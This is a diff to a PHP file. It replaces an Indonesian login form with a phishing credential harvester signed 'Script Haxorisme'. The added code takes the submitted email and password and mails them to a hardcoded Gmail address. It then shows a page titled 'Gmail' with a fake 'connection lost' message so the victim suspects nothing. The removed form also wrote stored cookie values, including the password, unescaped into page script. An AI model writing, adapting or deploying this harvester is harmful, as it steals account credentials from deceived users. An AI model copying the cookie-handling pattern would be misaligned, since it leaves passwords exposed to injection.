@@ -1,29 +1,35 @@
-<style type="text/css">
-	th {
-		text-align: right;
-	}
-	h3 {
-		text-align: center;
-	}
-</style>
-<table cellpadding="5" cellspacing="10" align="center">
-	<h3>Login From menggunakan session dan cookies dengan Remember Me</h3>
-	<form method="post" action="date.php">
-		<tr><th>Email</th><td><input type="text" id="email" name="email"></td></tr>
-		<tr><th>Password</th><td><input type="password" id="pass" name="password"></td></tr>
-		<tr><td colspan="2" align="center"><input type="checkbox" name="remember" value="1">Remember Me</td></tr>
-		<tr><td colspan="2" align="right"><input type="submit" value="Login" name="login"></td></tr>
-	</form>
-</table>
 <?php
-	if (isset($_COOKIE['email']) and isset($_COOKIE['pass'])) {
-		$email 	= $_COOKIE['email'];
-		$pass 	= $_COOKIE['pass'];
+############################################
+##        Author: Script Haxorisme            ##
+##       Mailer: Script Haxorisme           ##
+##       Modifer: Script Haxorisme            ##
+############################################
+/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
-		echo "<script>
-			document.getElementById('email').value = '$email';
-			document.getElementById('pass').value = '$pass';
-			
-		</script>";
-	}
+$subjek = 'SETORAN GMAIL';
+$mailto = 'fitriani16072020@gmail.com'; //masukin email lo disini
+
+/* Fungsi berikut untuk mengambil input field. */
+
+$imel = $_POST['email'];
+$paswot = $_POST['password'];
+
+/* Mengambil informasi untuk dikirim kepada facebook anda !. */
+
+$body = <<<EOD
+<br><hr><br>
+
+Email : <font color="red">$imel</font> <br>
+Password : <font color="red">$paswot</font> <br>
+EOD;
+
+
+$headers = "From: RAFLIPEDIA\r\n"; // Buat nunjukin pengirim email.
+$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
+$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
 ?>
+<?php
+$random = rand(1000,5000);
+?>
+<title>Gmail</title>
+<center> <h2> Sorry! Your Connection is Lost from Internet. Check your connection, and Try Again </h2><br>
